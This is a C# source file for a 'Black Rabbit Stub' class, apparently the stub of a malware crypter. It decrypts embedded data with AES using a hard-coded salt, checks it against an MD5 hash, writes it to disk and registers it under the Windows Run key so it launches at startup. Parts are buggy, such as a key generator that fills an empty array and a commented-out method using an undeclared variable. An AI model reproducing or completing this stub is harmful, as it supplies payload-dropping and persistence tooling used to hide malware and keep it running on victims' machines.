using System;
using System.Security.Cryptography;
using System.IO;
using System.Text;
using Microsoft.Win32;

/// <summary>
/// Black Rabbit Stub Class
/// </summary>
public class Brstub
{
   

    /// <summary>
    /// Type of register key.
    /// </summary>
    public enum RegKeyType
    {
#pragma warning disable CS1591
        CurrentUser,    
        LocalMachine
#pragma warning restore CS1591
    }

    //PRIVATE METHODS

    private static string GetMd5Hash(MD5 md5Hash, byte[] input)
    {

        // Convert the input string to a byte array and compute the hash.
        byte[] data = md5Hash.ComputeHash(input);

        // Create a new Stringbuilder to collect the bytes
        // and create a string.
        StringBuilder sBuilder = new StringBuilder();

        // Loop through each byte of the hashed data 
        // and format each one as a hexadecimal string.
        for (int i = 0; i < data.Length; i++)
        {
            sBuilder.Append(data[i].ToString("x2"));
        }

        // Return the hexadecimal string.
        return sBuilder.ToString();
    }

    //PUBLIC METHODS

    //untested
    /// <summary>
    /// Generate MD5 hash.
    /// </summary>
    /// <param name="input">Byte array of data to hash</param>
    /// <returns>Hash as string.</returns>
    public string GetMd5Hash(byte[] input)
    {

        
        MD5 md5Hash = MD5.Create(); 
        // Convert the input string to a byte array and compute the hash.
        byte[] data = md5Hash.ComputeHash(input);

        // Create a new Stringbuilder to collect the bytes
        // and create a string.
        StringBuilder sBuilder = new StringBuilder();

        // Loop through each byte of the hashed data 
        // and format each one as a hexadecimal string.
        for (int i = 0; i < data.Length; i++)
        {
            sBuilder.Append(data[i].ToString("x2"));
        }

        // Return the hexadecimal string.
        return sBuilder.ToString();
    }

    /*
    /// <summary>
    /// Encrypt file with random key and IV.
    /// </summary>
    /// <param name="file">File as byte array.</param>
    /// <returns>Returns tuple: Item1=encrypted file as byte array, Item2=key, Item3=IV </returns>
    public Tuple<byte[], byte[], byte[]> Encrypt(byte[] file)
    {
        byte[] encrypted;
        byte[] key;
        byte[] IV;

        using (Aes aesecr = Aes.Create())
        {

            aesecr.BlockSize = 128;
            aesecr.KeySize = 256;
            aesecr.Mode = CipherMode.CBC;

            aesecr.GenerateKey();
            aesecr.GenerateIV();

            key = aesecr.Key;
            IV = aesecr.IV;



            var encryptor = aesecr.CreateEncryptor(aesecr.Key, aesecr.IV);

            // Create the streams used for encryption. 
            using (var msEncrypt = new MemoryStream())
            {
                using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                {
                    msEncrypt.Write(file, 0, file.Length);
                    csEncrypt.Close();
                }
                encrypted = msEncrypt.ToArray();
            }
        }
        return new Tuple<byte[], byte[], byte[]>(encrypted, key, IV);
    }

    /// <summary>
    /// Encrypt file with user set key and random IV.
    /// </summary>
    /// <param name="file">File as byte array.</param>
    /// <param name="key">Key as byte array.</param>
    /// <returns>Returns tuple: Item1=encrypted file as byte array, Item2=IV </returns>
    public Tuple<byte[], byte[]> Encrypt(byte[] file, byte[] key)
    {
        byte[] encrypted;
        byte[] IV;

        using (Aes aesecr = Aes.Create())
        {

            aesecr.BlockSize = 128;
            aesecr.KeySize = 256;
            aesecr.Mode = CipherMode.CBC;

            aesecr.Key = key;
            aesecr.GenerateIV();

            IV = aesecr.IV;



            var encryptor = aesecr.CreateEncryptor(aesecr.Key, aesecr.IV);

            // Create the streams used for encryption. 
            using (var msEncrypt = new MemoryStream())
            {
                using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                {
                    msEncrypt.Write(file, 0, file.Length);
                    csEncrypt.Close();

                }
                encrypted = msEncrypt.ToArray();
            }
        }
        return new Tuple<byte[], byte[]>(encrypted, IV);
    }

    /// <summary>
    /// Encrypt file with user set key and IV
    /// </summary>
    /// <param name="file">>File as byte array.</param>
    /// <param name="key">Key as byte array.</param>
    /// <param name="IV">IV as byte array.</param>
    /// <returns></returns>
    public byte[] Encrypt(byte[] file, byte[] key, byte[] IV)
    {
        byte[] encrypted;


        using (Aes aesecr = Aes.Create())
        {

            aesecr.BlockSize = 128;
            aesecr.KeySize = 256;
            aesecr.Mode = CipherMode.CBC;

            aesecr.Key = key;
            aesecr.IV = IV;


            ICryptoTransform encryptor = aesecr.CreateEncryptor(aesecr.Key, aesecr.IV);

            // Create the streams used for encryption. 
            using (var msEncrypt = new MemoryStream())
            {
                using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                {
                    msEncrypt.Write(file, 0, file.Length);
                    csEncrypt.Close();
                   
                }
                encrypted = msEncrypt.ToArray();
            }
        }
        return encrypted;
    }


    /// <summary>
    /// Decrypt file.
    /// </summary>
    /// <param name="encFile">Encrypted file as byte array.</param>
    /// <param name="key">Key as byte array.</param>
    /// <param name="IV">IV as byte array.</param>
    /// <returns>Byte array of decrypted file.</returns>
    public byte[] Decrypt(byte[] encFile, byte[] key, byte[] IV)
    {

        
        using (Aes aesdcr = Aes.Create())
        {
            aesdcr.BlockSize = 128;
            aesdcr.KeySize = 256;
            aesdcr.Mode = CipherMode.CBC;
    

            aesdcr.Key = key;
            aesdcr.IV = IV;

            ICryptoTransform decryptor = aesdcr.CreateDecryptor(aesdcr.Key, aesdcr.IV);

            using (var msDecrypt = new MemoryStream(encFile))
            {
                using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    //csDecrypt.Write(encFile, 0, encFile.Length);
                    //csDecrypt.Close();
                }   

                decrypted = msDecrypt.ToArray();
            }
        }

        return decrypted;
    }
   
    */
    /// <summary>
    /// Generate key.
    /// </summary>
    /// <returns></returns>
    public byte[] GenKey()
    {
        byte[] key= { };

        Random rnd = new Random();
        rnd.NextBytes(key);

        return key;
    }

    /// <summary>
    /// Encrypting data.
    /// </summary>
    /// <param name="bytesToBeEncrypted">Data to encrypt as byte array.</param>
    /// <param name="passwordBytes">Key as byte array.</param>
    /// <returns>Encrypted data as byte array.</returns>
    public byte[] Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
        byte[] encryptedBytes = null;

        // Set your salt here, change it to meet your flavor:
        // The salt bytes must be at least 8 bytes.
        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

        using (MemoryStream ms = new MemoryStream())
        {
            using (RijndaelManaged AES = new RijndaelManaged())
            {
                AES.KeySize = 256;
                AES.BlockSize = 128;

                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = key.GetBytes(AES.BlockSize / 8);

                AES.Mode = CipherMode.CBC;

                using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                    cs.Close();
                }
                encryptedBytes = ms.ToArray();
            }
        }

        return encryptedBytes;
    }

    /// <summary>
    /// Decrypting data.
    /// </summary>
    /// <param name="bytesToBeDecrypted">Data to decrypt as byte array.</param>
    /// <param name="passwordBytes">Key as byte array.</param>
    /// <returns>Decrypted data as byte array</returns>
    public byte[] Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
    {
        byte[] decryptedBytes = null;

        // Set your salt here, change it to meet your flavor:
        // The salt bytes must be at least 8 bytes.
        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

        using (MemoryStream ms = new MemoryStream())
        {
            using (RijndaelManaged AES = new RijndaelManaged())
            {
                AES.KeySize = 256;
                AES.BlockSize = 128;

                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = key.GetBytes(AES.BlockSize / 8);

                AES.Mode = CipherMode.CBC;

                using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                    cs.Close();
                }
                decryptedBytes = ms.ToArray();
            }
        }

        return decryptedBytes;
    }



    /// <summary>
    /// Check's decrypted file is correct.
    /// </summary>
    /// <param name="decrypted">This is decrypted file table.</param>
    /// <param name="hashMD5">This is hash require to compare with decrypted file hash.</param>
    /// <returns>Return true if hashes are  same, false if hashes are different.</returns>
    public bool CheckMD5(byte[] decrypted ,string hashMD5)
    {
        using ( MD5 md5Hash = MD5.Create())
        {
            // Hash the input.
            string hashOfInput = GetMd5Hash(md5Hash,decrypted);

            // Create a StringComparer an compare the hashes.
            StringComparer comparer = StringComparer.OrdinalIgnoreCase;

            if (0 == comparer.Compare(hashOfInput, hashMD5)) return true;
            
            else return false;
        }
    }

    /// <summary>
    /// Save decrypted array to file
    /// </summary>
    /// <param name="path">Path to save file</param>
    /// <returns>Return true if file's exist ,false if isn't exist.</returns>
    
    public bool SaveFile(string path ,byte[] decrypted)
    {
        File.WriteAllBytes(path, decrypted);

        if (File.Exists(path)) return true;
        else return false;
    }

    /// <summary>
    /// Add seved file to autostart register.
    /// </summary>
    /// <param name="appName">App name in name field in register.</param>
    /// <param name="path">Path to file to autostart.</param>
    /// <param name="regKey">Switcher between CurrentUser key and LocalMachine key(administrator required). </param>
    /// <returns>True if register is set or false if error.</returns>
    public bool AddToReg(string appName, string path, RegKeyType regKey)
    {
        RegistryKey rkApp;
        if (regKey == RegKeyType.CurrentUser)
        {
            rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        }
        else if (regKey == RegKeyType.LocalMachine)
        {
            rkApp = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        }
        else return false;

        rkApp.SetValue(appName, path);
        rkApp.Close();
        return true;
    }
    
}
